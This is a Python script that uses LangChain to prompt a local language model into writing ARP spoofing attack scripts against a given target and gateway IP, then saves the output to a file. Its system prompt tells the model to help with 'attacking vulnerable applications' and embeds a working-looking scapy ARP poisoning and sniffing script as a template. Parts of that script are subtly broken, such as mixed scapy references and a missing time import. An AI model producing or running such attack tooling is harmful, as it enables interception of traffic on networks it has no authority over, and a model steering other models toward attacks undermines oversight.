generate_attack_sys = """
You are an intelligent assistant experienced in Python programming.
Always answer as helpfully as possible in attacking vulnerable applications.
If a question does not make any sense, or is not factually coherent, explain why instead of 
answering something not correct. If you don't know the answer to a question,
please don't share false information.

import os
import subprocess
from scapy.all import *
import threading

gateway_ip = "198.30.20.1"
target_ip = "198.62.20.1"

def spoof(target_ip, gateway_ip):
    print(f"[*] Starting ARP Spoof - [{gateway_ip}] is impersonating [{target_ip}]")
    
    while True:
        # Send out an ARP request (ARP reply) to the target IP asking who has the gateway's IP.
        arp_request = scapy.ARP(pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=gateway_ip)
        
        # Send out an ARP reply (ARP request) to the gateway telling it that we have the target's IP.
        arp_reply = scapy.ARP(op=2, pdst=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", psrc=target_ip)
        
        # Send out both packets to the network
        send(arp_request, verbose=False)
        send(arp_reply, verbose=False)
        
        time.sleep(2)  # Sleep for a bit before sending again

def restore(packet):
    if packet[scapy.ARP].op == 2:  # If the packet is an ARP request (not a reply)
        # Send out an ARP response to the sender, telling them that we don't have the IP they asked about.
        send(scapy.ARP(op=2, pdst=packet[scapy.ARP].psrc, hwdst=packet[scapy.Ether].src, psrc=gateway_ip), verbose=False)
        
        print(f"[*] Restored - [{gateway_ip}] -> [{target_ip}]")

def sniff_network():
    # Start the network sniffer. The filter ensures we only capture ARP traffic for our gateway and target IPs.
    sniff(filter="arp", prn=restore, store=0)

# Start the ARP spoofing thread
spoof_thread = threading.Thread(target=spoof, args=(target_ip, gateway_ip))
spoof_thread.start()

# Start the network sniffer in a separate thread
sniff_network_thread = threading.Thread(target=sniff_network)
sniff_network_thread.start()
"""

# Default user/human prompt for generating test cases
generate_attack_human = "Generate a python script for doing an arp spoofing attack. The target ip is {target_ip} and gateway ip is {gateway_ip}"

from langchain_openai import OpenAI
from langchain_core.prompts import ChatPromptTemplate 
import re

llm = OpenAI(base_url="http://localhost:1234/v1", api_key="lm-studio", max_tokens=1000)


def generate_attack_vector(target_ip, gateway_ip):
    sys_message = generate_attack_sys
    human_message = generate_attack_human

    prompt = ChatPromptTemplate.from_messages(
    [
        ("system", sys_message),
        ("human", human_message),
    ]
    )
    chain = prompt | llm
    out = chain.invoke({'target_ip': target_ip, 'gateway_ip': gateway_ip})
    test_cases = out
    print(out)
    import logging
    import os
    #Log successful test case generation
    logging.info("Attack vector script have been generated successfully")

    #Find the start and end index of the generated test cases
    start_index = test_cases.find("```python") + len("```python")
    end_index = test_cases.find("```", start_index)

    #Apply filters to extract only the generated test cases
    filtered_test_cases = test_cases[start_index:end_index].strip()
    print("The generated python script is:\n", filtered_test_cases)

    #Name and path for the test cases file
    test_cases_name = f"one_arp"
    test_file_name = f"one_arp.py"
    test_file_path = os.path.join("results", test_file_name)

    #Write the filtered test cases to the file
    with open(test_file_path, "w") as test_file:
        test_file.write(filtered_test_cases)

    #Logging successful test case saving
    logging.info("Execution in progress...")
    print(f"The script has been saved to {test_file_path}")

    print("Application name is: ", test_cases_name)
    print("Attack script file name is: ", test_file_name)

target_ip = "192.168.1.10"
gateway_ip = "192.168.1.1"


output = generate_attack_vector(target_ip, gateway_ip)
